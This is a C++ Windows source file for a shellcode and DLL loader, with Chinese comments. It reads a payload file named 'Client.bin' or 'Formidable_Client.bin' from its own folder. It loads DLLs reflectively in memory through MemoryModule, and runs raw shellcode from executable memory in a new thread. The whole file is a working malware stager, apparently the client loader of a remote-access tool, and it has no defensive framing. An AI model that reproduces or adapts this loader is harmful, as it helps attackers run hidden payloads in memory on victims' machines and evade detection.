#include <windows.h>
#include <cstdio>
#include <vector>
#include <string>
#include "../../../Common/MemoryModule.h"

/**
 * ShellCode/DLL Loader
 * ---------------------------
 * 功能: 从当前目录下的 "Client.bin" 文件读取数据并执行。
 * 支持两种模式:
 * 1. 原始 ShellCode (直接跳转执行)
 * 2. DLL 文件 (使用 MemoryModule 反射加载)
 */

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    // 0. 获取当前目录
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    std::wstring currentDir = szPath;
    currentDir = currentDir.substr(0, currentDir.find_last_of(L"\\/"));
    std::wstring binPath = currentDir + L"\\Client.bin";

    printf("[*] Loader Started.\n");
    printf("[*] Looking for Payload at: %ws\n", binPath.c_str());

    // 1. 读取 Payload 文件
    HANDLE hFile = CreateFileW(binPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        binPath = currentDir + L"\\Formidable_Client.bin";
        printf("[*] Client.bin not found, trying: %ws\n", binPath.c_str());
        hFile = CreateFileW(binPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open Payload file. Error: %lu\n", GetLastError());
            return 1;
        }
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        printf("[-] Payload file is empty.\n");
        CloseHandle(hFile);
        return 1;
    }

    std::vector<unsigned char> payload(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, payload.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] Failed to read file. Error: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    
    printf("[+] Payload loaded. Size: %lu bytes\n", fileSize);

    // 2. 尝试识别文件类型 (PE vs ShellCode)
    bool isPE = false;
    if (fileSize > 2 && payload[0] == 'M' && payload[1] == 'Z') {
        isPE = true;
        printf("[*] Detected PE format (DLL).\n");
    } else {
        printf("[*] Assuming Raw ShellCode.\n");
    }

    if (isPE) {
        // 使用 MemoryModule 加载 DLL
        HMEMORYMODULE hMod = MemoryLoadLibrary(payload.data(), fileSize);
        if (hMod) {
            printf("[+] MemoryLoadLibrary success.\n");
            // 尝试获取导出函数 "Start" 或 "DllMain" 自动执行
            // ClientDLL 默认在 DllMain 创建线程，所以加载即运行
            
            // 保持主线程运行，直到用户终止或收到信号
            printf("[*] DLL loaded. Waiting...\n");
            Sleep(INFINITE);
            
            MemoryFreeLibrary(hMod);
        } else {
            printf("[-] MemoryLoadLibrary failed.\n");
            return 1;
        }
    } else {
        // 原始 ShellCode 执行逻辑
        void* execMem = VirtualAlloc(0, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!execMem) {
            printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
            return 1;
        }
        memcpy(execMem, payload.data(), fileSize);
        
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        VirtualFree(execMem, 0, MEM_RELEASE);
    }

    return 0;
}
